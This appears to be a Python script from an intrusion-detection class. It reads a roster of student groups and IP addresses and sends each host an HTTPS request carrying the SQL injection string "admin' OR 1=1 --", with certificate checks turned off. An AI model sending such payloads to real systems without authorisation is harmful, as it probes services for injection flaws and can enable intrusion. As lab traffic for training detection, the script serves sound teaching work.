import json
import argparse
import requests

def load_roster(path):
    with open(path) as f:
        return json.load(f)

def send_sqli(ip):
    print("Sending simulated SQL injection to {}:443".format(ip))

    # No endpoint — just hit the root path
    url = "https://{}:443/".format(ip)

    # Classic SQLi pattern: ' OR 1=1 --
    params = {
        "q": "admin' OR 1=1 --"
    }

    try:
        r = requests.get(url, params=params, timeout=3, verify=False)
        print("Request sent: {}".format(r.url))
        print("HTTP status: {}".format(r.status_code))
    except Exception as e:
        print("{} -> request failed ({})".format(ip, e))

def attack_group(group_name, roster):
    if group_name not in roster:
        print("Group '{}' not found".format(group_name))
        return

    group = roster[group_name]
    for student in group:
        ip = group[student]
        print("{} -> {}".format(student, ip))
        send_sqli(ip)

def main():
    parser = argparse.ArgumentParser(description="Class SQL Injection Simulator (HTTPS)")

    parser.add_argument("--roster", default="ids_sec3_students.json",
                        help="Roster JSON file (default: ids_sec3_students.json)")
    parser.add_argument("--target-group", help="Group name (e.g., group1)")
    parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
    args = parser.parse_args()

    roster = load_roster(args.roster)

    if args.target_ip:
        send_sqli(args.target_ip)

    if args.target_group:
        attack_group(args.target_group, roster)

    if not args.target_ip and not args.target_group:
        print("Use --target-group <name> or --target-ip <ip>")

if __name__ == "__main__":
    main()
